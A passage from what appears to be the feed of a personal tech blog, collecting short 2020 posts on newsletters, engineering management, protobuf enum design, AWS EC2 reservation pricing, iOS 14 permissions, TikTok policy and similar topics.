<p>It’s starting to feel as if everyone I follow on Twitter is launching a Substack newsletter. I don’t know how this plays out but my inbox is already overwhelmed and having more longish-form content to go through just won’t happen. It’s an interesting space that’s changing quickly and will look very different in a few years. Many seem to think that there’s a huge opportunity here for authors to build a niche audience that’s able to sustain their writing but i’m not wholly convinced. If you’re able to get the best of the best does it make sense to go for the second tier? Some people may want that additional depth but the majority will be happy with the highly skilled writer covering a broad topic. These will be the small number of authors who amass huge audiences and capture the majority of the revenue while the rest will be focused on niche topics with enough of an audience to keep them going. Inevitably, these “tail” writers will band together and offer their newsletters as a bundle. What’s old is new and we will see the rebirth of newspapers and magazines.</p>

<p>A framework to look at these is to analyze them against two dimensions: their generality and their continued relevance. With the former, it’s more difficult to stand out when you’re trying to write for a broad audience but the total opportunity is much larger. A niche topic, on the other hand, faces less competition but may not have the necessary audience. With the latter, it’s more difficult to write evergreen content and much easier to run into a limit. There will be posts that cross quadrants but I expect many newsletters to fit squarely within a quadrant. I worry that those focused on the niche/evergreen bucket will run out of content and be forced to switch to topical content or become part of a bundle.</p>

<p>The ideal spot is to have broad audience appeal and write topical posts. There will always be something to write about and so long as the writing is effective you end up with a large and growing audience. At this point there’s a pretty large first-mover advantage and it’ll be interesting to see how many remain after a few years.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Gasoline</title>
   <link href="http://dangoldin.com/2020/10/21/gasoline/"/>
   <updated>2020-10-21T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/10/21/gasoline</id>
   <content:encoded><![CDATA[
<p>I’m a believer in climate change and know we need to change our habits and yet every time I drive I’m reminded of how amazing gasoline is. A gallon of a liquid is not much - we can all drink a gallon of water a day and yet a gallon of gasoline is enough to move a mutli-ton car more than 20 miles. It’s so normal that we don’t appreciate how amazing that actually is.</p>

<p>We all bash gasoline now and it may be terrible for the environment now but it’s also been a driver for nearly all tech innovation of the 20th century. It made long distance travel and transport reliable and cost effective. Even now it’s still powering the economy and allowing us to get everything we need delivered to our homes. All this from a clear liquid (turns out it’s dyed later on based on its grade) that from afar is indistinguishable from water.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Cold turkey and fighting temptations</title>
   <link href="http://dangoldin.com/2020/09/22/cold-turkey-and-fighting-temptations/"/>
   <updated>2020-09-22T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/09/22/cold-turkey-and-fighting-temptations</id>
   <content:encoded><![CDATA[
<p>Some people are able to control urges but I’m much better off just removing the objects of desire entirely. In high school this manifested in me spending way too much time on video games. These days it’s buying a bag of potato chips and then being unable to stop once I crack it up. I tried giving TikTok a go to see what all the fuss was about but had to drop it cold turkey after realizing that I was spending too much time on it.</p>

<p>Being able to control your impulses is an especially valuable skill these days due to both modern distractions and COVID’s effect on our willpower. I envy those that are able to keep their temptations in check but I’ve learned to just drop them cold turkey.</p>

<p>I’ve tried tackling these by having a more quantitative review of how I spend my time in order to hold myself accountable but there’s always more to do. I’m loath to push for technology solutions to this but it does feel as if there’s an opportunity for products to start off being extremely addicting at first and then become frustrating after too much time is spent. The pay to play games come to mind since once you exhaust your credits there’s significant friction to keep going - can this model work for other temptations? That’s something that I would pay for.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Get Google Group membership using Calendar</title>
   <link href="http://dangoldin.com/2020/09/05/get-google-group-membership-using-calendar/"/>
   <updated>2020-09-05T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/09/05/get-google-group-membership-using-calendar</id>
   <content:encoded><![CDATA[
<p>I’m not sure where I discovered this tip but I’ll often want to know the members of a Google group. The ways to get this are constantly changing - from double clicking the group within the Gmail compose window for a summary modal to going deep into the Groups UI. Somewhere in between is the group view provided by Google Calendar. I’m often in there and it turns out to be a pretty quick way of getting the list of all the users in a group without having to have anything open in another tab. One of the best parts is that it gives you the ability to expand and dedup group memberships which is great for dealing with nested groups - such as sub teams.</p>

<p>To get the membership you can simply add a group alias to the calendar invite, expand the list, and then hit the expand icon to get the flattened and deduped list.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>iOS 14 and local network access</title>
   <link href="http://dangoldin.com/2020/09/03/ios-14-and-local-network-access/"/>
   <updated>2020-09-03T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/09/03/ios-14-and-local-network-access</id>
   <content:encoded><![CDATA[
<p>Last week I installed the iOS 14 beta since I’m curious about what’s coming - even if it ends up bricking my phone. I expected it to come with more privacy features but one that surprised me was an alert that apps wanted to “find and connect to devices on your local network.” This is an obvious one Apple covered this functionality during <a href="https://developer.apple.com/videos/play/wwdc2020/10110/">WWDC</a>. It’s interesting seeing which apps request this permission and speculate why.</p>

<p>Both Facebook and WhatsApp requested it. The generous view is that this makes it easier and quicker to share large files with other devices on the same network. The cynical view is that this is another way for Facebook to track users through their devices. If they knew all the devices on the same network would they be able to identify households? Would they be able to identify the owners of the devices? Likely they can already do this but this is yet another weapon in their tracking arsenal.</p>

<p>Google Photos was another one. The generous and cynical views are the same as above but I haven’t seen any other Google app request this permission so I’m more willing to give them the benefit of the doubt. The only two other apps that requested the permission were Signal and Sleep Cycle. Signal likely for the local file sharing use case and Sleep Cycle likely for some “smart device” integration.</p>

<p>So far I’ve declined every single request and haven’t seen any additional requests. This might be because I just haven’t found the functionality in other apps that requests the feature or more likely that I just haven’t had to use many of the other apps. It’ll be interesting to see where else this request pops up.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Working your way up the engineering management stack</title>
   <link href="http://dangoldin.com/2020/08/28/working-your-way-up-the-engineering-management-stack/"/>
   <updated>2020-08-28T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/08/28/working-your-way-up-the-engineering-management-stack</id>
   <content:encoded><![CDATA[
<p>During a engineering management peer group discussion this morning we were talking about how involved each of us are in our team’s activities - for example how often do we look at code? Do we leave comments on pull requests? How involved are we in spec reviews? And a variety of questions of that ilk.</p>

<p>At that point in time I wasn’t clever enough to come up with a framework but it’s very much about working your way up further from the code as you work your way up the management track.</p>

<ul>
  <li><strong>Code and Pull Requests</strong>. As a first time manager or lead you’re likely looking at the code your team is writing and offering feedback and suggestions. You’re not too far removed from the code and if necessary you can dive right in and start contributing.</li>
  <li><strong>Tickets and Stories</strong>. At this level you’re involved in the user stories and are making sure that the scope and acceptance criteria are tight. If the tickets look good you assume the code will be good as well. You’re still looking at the code to see how it was implemented but you’re primarily concerned with the business value being delivered.</li>
  <li><strong>Epics and Specs</strong>. Here you’re more concerned with the larger projects and how they’re set up. Everyone affected or curious should be encouraged to be involved in the spec process but at this level you may not even investigate the stories or code being written so long as you understand the architecture and spec.</li>
  <li><strong>Initiatives and Roadmap</strong>. And what’s more abstract than looking at a project and spec? Looking at many projects and specs! You’re thinking more strategically and making sure the various projects are all supporting the long term vision of the company. This in turn influences your organizational and hiring decisions.</li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Back to Mac</title>
   <link href="http://dangoldin.com/2020/08/24/back-to-mac/"/>
   <updated>2020-08-24T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/08/24/back-to-mac</id>
   <content:encoded><![CDATA[
<p>After almost 2 years of Ubuntu I’ve moved to a Mac. There were a variety of reasons for switching back but the ultimate reason was simply that I had stability issues on Ubuntu and it was rare for it to go a week without freezing up. The overall lack of polish in Ubuntu didn’t help but I could have dealt with it had it not be for the frequent freezes and crashes.</p>

<p>Now that I’m back on Mac and OS X it’s been pretty amazing seeing how polished and seamless Apple’s ecosystem is. The first I noticed was the ability to unlock the computer with my watch - it’s not the most amazing thing in the world but a pretty nice and surprising touch. The second was the smooth integration of Apple Pay across both phone and desktop. It’s always a pain typing a credit card number and being able to just have it auto-completed is a nice touch.</p>

<p>I’m sure I’ll discover more of these and each one on its own is a simple convenience but combined they offer a compelling user experience that only gets better. In Diablo terms it’s akin to building a set - one item has a few benefits but as you invest more and more in the set you unlock more and more benefits. And maybe this is all a shock to me since I came from Ubuntu but having these sorts of quality of life features that are part of my phone available via the desktop is pretty awesome. I’m not going to be the first one to have Apple’s nanobots in my body but it’s not an impossibility.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>An era of productivity</title>
   <link href="http://dangoldin.com/2020/08/21/an-era-of-productivity/"/>
   <updated>2020-08-21T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/08/21/an-era-of-productivity</id>
   <content:encoded><![CDATA[
<p>A trap software engineers usually fall into is underestimating how long some things will take and I’m no different. Yet lately I’ve somehow been on the other end. Nearly every task I’ve had to do the past few weeks - either technical, managerial, or personal - has ended up taking a shorter amount of time than I expected. The blocker has been getting into the mindset and finding the time to do it but once I start I crank it out.</p>

<p>An example is updating my fantasy football stats scraper for the upcoming season and writing the corresponding <a href="/2020/08/18/yahoo-fantasy-football-stats-2020-2021-edition/">blog post</a>. I figured there would be unknowns and a fair estimate was a few hours. Turns out that once I started doing the work it probably took about 5 minutes to get the environment set up on a new computer, another 10 minutes to fix the code for Yahoo’s annual changes, and another 15 minutes to write the blog post.</p>

<p>Maybe it’s because I’ve gotten more conservative with my estimates over the years, maybe it’s because I’m more proficient than I used to be, or maybe this is all a fluke and I’ll revert to the mean soon enough. In any case I should take advantage of this era of productivity.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Yards, balls, fences, and software engineering</title>
   <link href="http://dangoldin.com/2020/08/20/yards-balls-fences-and-software-engineering/"/>
   <updated>2020-08-20T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/08/20/yards-balls-fences-and-software-engineering</id>
   <content:encoded><![CDATA[
<p>One of my strongest beliefs is that the best engineers are able to find ways to unblock themselves. Similarly, a pet peeve is when people say “that’s not my job” and expect a problem to be fixed by someone else. Sure this may occasionally happen but it’s important to have the attitude that you’re willing to get your hands dirty in order to solve your problem and move on.</p>

<p>An analogy I used to represent this concept is to imagine having a house with a yard that’s next to a neighbor. Let’s say you’re throwing a ball around and it lands in your neighbor’s yard. Do you quickly hop over, grab it, and then come back? Or do you go to their front door, ring the bell, and then have them retrieve it for you? If you have a good relationship with your neighbor you’d clearly just go and get the ball.</p>

<p>Now imagine the relationship’s not so good and there’s a fence. Would you hop over it? What if it was barbed wire? What if it was also electrified? You can keep going making it more and more extreme but at some point you just can’t get the ball yourself and may even need to write it off entirely.</p>

<p>The goal for engineers, their teams, and their applications is to be the friendly neighbors where visits are not just tolerated but encouraged. That’s how you’re able to move quickly and assume end-to-end ownership over the product you’re building.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Apple and Mr. Burns: Indestructible</title>
   <link href="http://dangoldin.com/2020/08/20/apple-and-mr-burns-indestructible/"/>
   <updated>2020-08-20T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/08/20/apple-and-mr-burns-indestructible</id>
   <content:encoded><![CDATA[
<p>Apple hit a $2T market cap and yet I can’t help but think they’re in an incredibly precarious situation due to the relationship between the US and China. I find the Apple/US/China dynamic much more interesting than what’s going on with TikTok. Right now it feels as if every side wants Apple to succeed. For the US it’s a success story and a cultural export to the world. To China it’s an indicator that they can power the manufacturing, at scale, of one of the most sophisticated technical products in the world and a massive boon to their economy. Yet it only takes a bit of politics to completely disrupt that balance.</p>

<amp-youtube data-videoid="aI0euMFAWF8" layout="responsive" width="640" height="480"></amp-youtube>

<p>The Simpsons has a famous clip where Mr. Burns goes to the doctor only to find that he has so many diseases that they’re all balancing each other out, and thus rendering him “indestructible.” Apple seems to be in that situation and yet the stock market views Apple as the most valuable company in the world. Sure both the US and China benefit from being supportive of Apple but it’s an incredibly dangerous position to be in, especially with the current state of politics.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Yahoo fantasy football stats: 2020-2021 edition</title>
   <link href="http://dangoldin.com/2020/08/18/yahoo-fantasy-football-stats-2020-2021-edition/"/>
   <updated>2020-08-18T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/08/18/yahoo-fantasy-football-stats-2020-2021-edition</id>
   <content:encoded><![CDATA[
<p>For the fifth year in a row I’ve updated my script to fetch the projected stats for the upcoming fantasy football season. These days I’m torn on football as a whole - both due to its politics and dangers - and don’t plan on watching too many games. Yet I enjoy the competition with my friends and the rote work of updating my scraping script to work every year.</p>

<p>This time around there haven’t been too many changes: Yahoo changed the order of a few columns and introduced some minor stylistic changes but the code only needed a <a href="https://github.com/dangoldin/yahoo-ffl/commit/764420d899ce26dae773470b9323875d702c9b41">few changes</a> to work - much simpler than last year which required running with an <a href="https://github.com/dangoldin/yahoo-ffl/commit/82f1f14e84663d447cdb9db0b5738de4db64fe8c">adblocking extension to bypass a script blocker</a>.</p>

<p>As usual the <a href="https://github.com/dangoldin/yahoo-ffl">code</a> and <a href="https://github.com/dangoldin/yahoo-ffl/blob/master/stats-2021.csv">data</a> are up on GitHub and pull requests are welcome. Every year I have ambitions to build an ML model to actually automate the draft process and every year I fail. Given everything going on I won’t even try this year - that’s going to be a goal for 2021.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The sandpaper learning method</title>
   <link href="http://dangoldin.com/2020/08/18/the-sandpaper-learning-method/"/>
   <updated>2020-08-18T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/08/18/the-sandpaper-learning-method</id>
   <content:encoded><![CDATA[
<p>When gluing two pieces of wood it’s useful to use sandpaper to improve the effectiveness of the glue. Learning follows the same pattern: you want to struggle a bit and get yourself ready so the knowledge sticks.</p>

<p>Imagine you have two people who each encounter a problem they don’t know how to solve. The first immediately goes and asks for help from a peer and quickly get it resolved. The second person tries to solve it themselves, does research, tries a few different approaches, struggles throughout and then ends up getting help from a peer. The first person gets to the solution quicker but it’s the second person who actually learns. The struggle for the second person made it easier for them to both understand and retain the resolution. It’s the second person that will have that faster rate of learning and will be able to apply their knowledge more broadly than the first.</p>

<p>It may feel that others are moving faster than you by going straight to the answer but that is very much “teaching to the test” rather than actually getting a deep and comprehensive knowledge of the matter. Doing things the right way may feel more difficult but it’s the way to truly attain knowledge and pays off in the long run.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Coupling in action: protobuf enum fields</title>
   <link href="http://dangoldin.com/2020/08/17/coupling-in-action-protobuf-enum-fields/"/>
   <updated>2020-08-17T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/08/17/coupling-in-action-protobuf-enum-fields</id>
   <content:encoded><![CDATA[
<p>The next few blog posts are all topics that have come up recently in my 1-1s and serve as good examples for how I think about code and software engineering. The first post is a discussion around coupling and the tradeoffs we considered.</p>

<p>Our pipeline was covered in depth on the <a href="http://highscalability.com/blog/2020/6/15/how-triplelift-built-an-adtech-data-pipeline-processing-bill.html">high scalability blog</a> but the important part for this post is our event collection piece which consists of the following components:</p>

<ul>
  <li>Producers: We have a few applications that are emitting data in protobuf to Kafka. Each topic represents an event type with its own protobuf definition.</li>
  <li>Kafka: We run a pretty large cluster in a single region.</li>
  <li><a href="https://github.com/pinterest/secor">Secor</a>: An open source library from Pinterest that takes events from Kafka and uploads them to a S3 in a big-data friendly format.</li>
</ul>

<p>The overall flow is simple: producers emit protobuf messages to Kafka and then Secor reads those messages and converts them to Parquet. One question we had was how to handle enums in protobuf. Imagine the following definition for an event we’d want to emit to Kafka:</p>

<figure class="highlight"><pre><code class="language-protobuf" data-lang="protobuf"><span class="kd">enum</span> <span class="n">Status</span> <span class="p">{</span>
	<span class="na">VALID</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="na">ERROR</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">message</span> <span class="nc">Test</span> <span class="p">{</span>
	<span class="k">required</span> <span class="kt">int64</span> <span class="na">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
	<span class="k">required</span> <span class="kt">string</span> <span class="na">url</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
	<span class="k">required</span> <span class="n">Status</span> <span class="na">status</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>And we had the following mapping between the Kafka topic and the protobuf definition:</p>

<figure class="highlight"><pre><code class="language-conf" data-lang="conf"><span class="n">secor</span>.<span class="n">protobuf</span>.<span class="n">message</span>.<span class="n">class</span>.<span class="n">test_message</span>=<span class="n">com</span>.<span class="n">name</span>.<span class="n">kafka</span>.<span class="n">TestMessage</span>$<span class="n">Test</span></code></pre></figure>

<p>Now imagine we had to add a new value to our Status enum (eg WARN = 3). In that case, we would have to deploy Secor with the latest protobuf definition before it saw any of the actual messages - otherwise it would not be able to handle the new enum.</p>

<p>An alternative method is to have the following definition for the message:</p>

<figure class="highlight"><pre><code class="language-protobuf" data-lang="protobuf"><span class="kd">message</span> <span class="nc">Test</span> <span class="p">{</span>
	<span class="k">required</span> <span class="kt">int64</span> <span class="na">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
	<span class="k">required</span> <span class="kt">string</span> <span class="na">url</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
	<span class="k">required</span> <span class="kt">int32</span> <span class="na">status_id</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>With this definition Secor is decoupled from the definition of the enum value. The producer can start sending new enum types with us having to do anything with Secor.</p>

<p>We chose the second route because it was better for us but others may prefer the first option. You may actually want to have that coupling to ensure stronger consistency between your components and you want it to fail fast if there are any problems. Similarly, if you have other consumers from Kafka that would need to convert the field back into an enum you’d want to enforce that safety. There’s no solution that’s right for everyone but it is important to understand your constraints and the tradeoffs.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Traveling at the speed of light through life</title>
   <link href="http://dangoldin.com/2020/08/16/traveling-at-the-speed-of-light-through-life/"/>
   <updated>2020-08-16T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/08/16/traveling-at-the-speed-of-light-through-life</id>
   <content:encoded><![CDATA[
<p>Years ago I was reading <a href="https://www.amazon.com/Elegant-Universe-Superstrings-Dimensions-Ultimate/dp/039333810X">The Elegant Universe</a> and came across a mind-blowing idea - both then and every time I remember it: we’re always traveling at the speed of light through four dimensions - the three spatial dimensions as well as time. It just happens that almost all of that speed is through time. But that does mean that as you speed up in the spatial dimensions, time slows down - which has been shown to be true by <a href="https://en.wikipedia.org/wiki/Hafele–Keating_experiment">measuring time drift</a> in airplanes.</p>

<p>There’s a strong parallel here to how we spend our time. Time moves the same for all of us and yet we all use it differently. Some of the demands are non-negotiable, or seemingly non-negotiable, but most of us can control at least the way we use some of our time. It’s a battle I constantly wage and modern distractions make it incredibly difficult to stay focused.</p>

<p>Time is one of those things that’s easy to ignore in the moment and yet regret losing as you age. I felt the freest in my twenties and now wish I spent it differently when I had fewer demands on my time. I’m sure I’ll feel differently in the future but it does seem as we get older there’s less and less truly personal time.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Big money, not big data</title>
   <link href="http://dangoldin.com/2020/08/16/big-money-not-big-data/"/>
   <updated>2020-08-16T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/08/16/big-money-not-big-data</id>
   <content:encoded><![CDATA[
<p>It’s common for companies to complain about the challenges of running big data and how difficult it is. The reality is that unless you’re running at massive scale (Google or Facebook) your problems are more to do with big money rather than big data. It’s expensive to store, process, and expose terabytes and the difficulty is in doing it cost effectively, not in simply doing it. There are enough modern tools out there across all the cloud providers (AWS, GCP, Azure) and vendors (Snowflake, Databricks) that it’s possible to do nearly everything you want but you’ll just have to pay for it.</p>

<p>At Facebook and Google scale you run into problems that the existing set of technology tools can’t solve and that’s when you have to push the state of the art forward. For the rest of us the problem is solved but expensive. At the same time we are starting to see more cost-effective ways of handling big data. One of the best examples is separating storage from compute. Computation is expensive but storage is cheap. Another example is probabilistic techniques for summarizing and analyzing datasets - for example <a href="https://en.wikipedia.org/wiki/HyperLogLog">HyperLogLog</a> makes it much cheaper to count values and various data science sampling techniques make it cost effective to train data science models.</p>

<p>What is difficult is balancing the cost of big data infrastructures with the value they provide. How much value is a query that runs a second faster? Is $5,000 in additional monthly data costs worth it? Everyone has a different answer to these questions which are becoming increasingly important as we start collecting, storing, and analyzing every data point.</p>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>TikTok: A Prisoner's Dilemma</title>
   <link href="http://dangoldin.com/2020/08/09/tiktok-a-prisoners-dilemma/"/>
   <updated>2020-08-09T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/08/09/tiktok-a-prisoners-dilemma</id>
   <content:encoded><![CDATA[
<p>Everyone has an opinion here and I’m late but joining the fray. I fall into the ban TikTok app. I would not be doing it the way it’s currently being done but there’s a legitimate case to make that the US should adopt a <a href="https://www.investopedia.com/terms/t/tit-for-tat.asp">tit for tat strategy</a> with China. China prevents many US companies from competing there so why should we allow it?</p>

<p>There are of course arguments around us being the United States and needing to take the high road. This was a worthwhile belief decades ago when we had the belief that a richer China would be a more democratic and fair China but in fact the opposite has happened - China has gotten more and more emboldened and now has leverage and power. Why let it get any stronger?</p>

<p>We already adopt trade restrictions and sanctions and this is another form of that. It’s also okay to adopt a new strategy after admitting a previous one failed - that’s called learning. And this itself can be an experiment where we try it for a set amount of time and then if it doesn’t have the desired outcome walk it back. A future administration can always blame this one for pushing it through.</p>

<p><a href="https://en.wikipedia.org/wiki/Game_theory">Game theory</a> deals with theory of these types of “games” and the exploration and derivation of optimal strategies. There are a variety of games and constraints but a common strategy in a repeated game is “<a href="https://www.investopedia.com/terms/t/tit-for-tat.asp">tit for tat</a>”. You assume good intentions in others and only deviate when they prove they can’t be trusted. It’s commonly used for studying the <a href="https://en.wikipedia.org/wiki/Prisoner%27s_dilemma">Prisoner’s Dilemma</a> which is a simple but fair representation of geo-politics: it’s better if both sides cooperate but one side has the incentive to deviate and take advantage of the other. Yet if both deviate each ends up with lower value than had they simply cooperated. This is akin to what’s happening with China right now. The US has been trying to cooperate but at some point we need to start pushing back.</p>

<p>Technology has made the world both more interconnected but also created another geo-political battlefield. It’s important for governments to realize that older techniques may no longer work and to get serious about these modern challenges.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Three types of advice from a manager</title>
   <link href="http://dangoldin.com/2020/08/09/three-types-of-advice-from-a-manager/"/>
   <updated>2020-08-09T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/08/09/three-types-of-advice-from-a-manager</id>
   <content:encoded><![CDATA[
<p>During one of my first meetings with a former manager he gave me an introduction to his working style. One of these was how he gave three types of advice:</p>

<ul>
  <li><strong>A passing thought</strong>. This is not something that was thought of too deeply and just popped into my mind. I’m sharing it in case it’s helpful but it’s just as likely to be useful.</li>
  <li><strong>A suggestion but trust you</strong>. I’ve run into similar scenarios in the past and learned from those experiences. This is one of those. At the same time I trust you to make the right decision since you understand the current problem and constraints better and know the modern tools. And if it turns out that the approach doesn’t work it would act as a learning opportunity.</li>
  <li><strong>Just do it</strong>. This is an order. While I will do my best to explain my reasoning I am your manager and don’t need to justify it.</li>
</ul>

<p>The expectation is that the first two should make up at least 90% of the advice (and ideally more) since they’re the ones that actually instill ownership and empower the individual to make decisions. It’s also a failure of a manager if you end up in a situation where you have to override your team that often. It may be an indicator that you did not provide enough context and that your team is not seeing the full picture. It may also be that the team just doesn’t have the skill or desire to operate at the level you need them to. In any case the fact that you need to resort to this last level often is a symptom of a problem that you need to root out.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Products change, humans stay the same</title>
   <link href="http://dangoldin.com/2020/07/30/products-change-humans-stay-the-same/"/>
   <updated>2020-07-30T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/07/30/products-change-humans-stay-the-same</id>
   <content:encoded><![CDATA[
<p>While on a quick driving errand a few days ago I decided to listen to the radio for the first time in years. I was quickly hit with a bit of nostalgia - the radio show that was on had one of those “First caller to answer this correctly gets Y” sessions. I’ve heard this thousands of times growing up but this was the first time in a very long time and for whatever reason I immediately thought of both how modern music streaming services no longer have these contests and that a similar need is being met by HQ Trivia.</p>

<p>Human needs and interests don’t change but the medium to deliver those do. We all love friendly competition with the hope of winning. Radio shows met this need at scale years ago and now it’s an app. An approach to product building is to think back to what life was like before the internet and how our needs and interests were met then. And are there modern solutions to those problems? I suspect there are quite a few of these nostalgia-driven products that are ripe for a digital version.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Analyzing the AWS EC2 reservation options</title>
   <link href="http://dangoldin.com/2020/07/27/analyzing-the-aws-ec2-reservation-options/"/>
   <updated>2020-07-27T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/07/27/analyzing-the-aws-ec2-reservation-options</id>
   <content:encoded><![CDATA[
<p>While writing the post on AWS reservations I started thinking if there’s any arbitrage opportunity in the reservations. For example - does it make sense to do a 1 year or 3 year reservation for some instance types of upgrade an instance class to get a better reservation value?</p>

<p>You can do this manually using ec2instances.info which provides a quick way to look at EC2 pricing info although forces you to pick the type of reservations you’re interested in. To speed things up I just ran the <a href="https://github.com/powdahound/ec2instances.info">ec2instances.info script</a> to scrape the data into a JSON with a <a href="https://github.com/dangoldin/analyze-ec2instance.info">quick script</a> to extract the relevant details into a CSV file. After that, it was as simple as loading into <a href="https://docs.google.com/spreadsheets/d/1h5H3vsZluk1_TGGMGrZq-KFiha-Bfhu4OBzyp5QynA8/edit#gid=0">Google sheets</a> for some analysis and visualization.</p>

<p>There are a few surprises - the biggest was how much of a variance there is by instance type. The smallest discount comes with the 1 year convertible, no up front payment option and ranges from around 21% for the i3en series but goes up to 49% for the i2 series. I’m sure most of this is a function of the age and demand for the types but it’s worth auditing use cases to see whether you get more bang for the buck on a slightly older instance. The same pattern holds when you look at the 3 year full up front payment options. The i2 series gets you a 75% discount while the discount on the i3en series climbs to 62%.</p>

<p>Another interesting analysis is to compare the cheapest reserved option (1 year convertible, no upfront) with the most expensive (3 year standard, full upfront) to check out the outliers. As expected, they’re strongly correlated but you do so see variance - for example the p2 and p3 series have a similar discount for the 1 year term term but the p2 gets you a 10% larger discount than the p3 for the 3 year term.</p>

<img src="http://dangoldin.com/assets/static/images/aws-ec2-reservation-comparison.png" alt="AWS EC2 Reservation type comparison" width="1189" height="736" layout="responsive"/>

<p>The code is up on <a href="https://github.com/dangoldin/analyze-ec2instance.info">GitHub</a> with the data available on a <a href="https://docs.google.com/spreadsheets/d/1h5H3vsZluk1_TGGMGrZq-KFiha-Bfhu4OBzyp5QynA8/edit#gid=0">Google spreadsheet</a> so if there’s anything else that stands out I’d love to know about it.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Amusing Russian translations in Duolingo</title>
   <link href="http://dangoldin.com/2020/07/24/amusing-russian-translations-in-duolingo/"/>
   <updated>2020-07-24T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/07/24/amusing-russian-translations-in-duolingo</id>
   <content:encoded><![CDATA[
<p>Many are using the lockdown as a way to improve themselves. I grew up a native Russian speaker which has unfortunately eroded over the years and I’ve spent the past few months improving my Russian through Duolingo. It’s a surprisingly effective app and has enough gamification to keep me going. My approach has been to just take the tests to skip out of lessons until I master every lesson. It started off easy but I’m now failing to advance about 20% of the time. Some of these are very much due to Russian specific issues - namely the fact that very often you can change the order of words in Russian without affecting the translation which Duolingo doesn’t seem to be able to handle well. Yet to keep things fun I’ve been screenshotting amusing translations and thought I’d share the best ones here.</p>

<ul class="thumbnails">
    <li class="span8">
        <div class="thumbnail">
            <img src="http://dangoldin.com/assets/static/images/duolingo-1.png" alt="Duolingo 1" width="828" height="1792" layout="responsive"/>
        </div>
    </li>
    <li class="span8">
        <div class="thumbnail">
            <img src="http://dangoldin.com/assets/static/images/duolingo-2.png" alt="Duolingo 2" width="828" height="1792" layout="responsive"/>
        </div>
    </li>
    <li class="span8">
        <div class="thumbnail">
            <img src="http://dangoldin.com/assets/static/images/duolingo-3.png" alt="Duolingo 3" width="828" height="1792" layout="responsive"/>
        </div>
    </li>
    <li class="span8">
        <div class="thumbnail">
            <img src="http://dangoldin.com/assets/static/images/duolingo-4.png" alt="Duolingo 4" width="828" height="1792" layout="responsive"/>
        </div>
    </li>
    <li class="span8">
        <div class="thumbnail">
            <img src="http://dangoldin.com/assets/static/images/duolingo-5.png" alt="Duolingo 5" width="828" height="1792" layout="responsive"/>
        </div>
    </li>
    <li class="span8">
        <div class="thumbnail">
            <img src="http://dangoldin.com/assets/static/images/duolingo-6.png" alt="Duolingo 6" width="828" height="1792" layout="responsive"/>
        </div>
    </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Quibi's problem</title>
   <link href="http://dangoldin.com/2020/07/11/quibis-problem/"/>
   <updated>2020-07-11T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2020/07/11/quibis-problem</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/quibi-survey.png" alt="Quibi survey" width="586" height="997" layout="responsive"/>

<p>Everyone loves to bash on Quibi, including me, and yet I feel guilty. We should applaud those who try something new rather than mock it in hindsight. Sure, Quibi raised a ton of money and has an illustrious team but they still deserve respect for attempting to build something from scratch.</p>

<p>Earlier this week I received a Quibi survey and decided to do my part to give them honest feedback. As I was going through the survey that was attempting to understand my usage (or lack of) I developed a personal theory of why it’s failing.</p>

<p>Quibi’s premise was that with the rise of mobile there’s a large number of people that want short, yet high production quality content on the go. That led to them both launching on mobile only and spending a huge amount of their cash on professional content. That intersection is the problem. Rather than increasing their market it limits it. If I want something on my phone I can just open up TikTok or Instagram and get a continual stream of video entertainment that is at a much finer granularity - not Quibi’s 10 minute mark. If, on the other hand, I want something professional I always have Netflix, or Disney+, or HBO, or Hulu, or countless others. Sure those episodes are longer but the reality is that I can stop at any time and just resume from wherever I left off.</p>

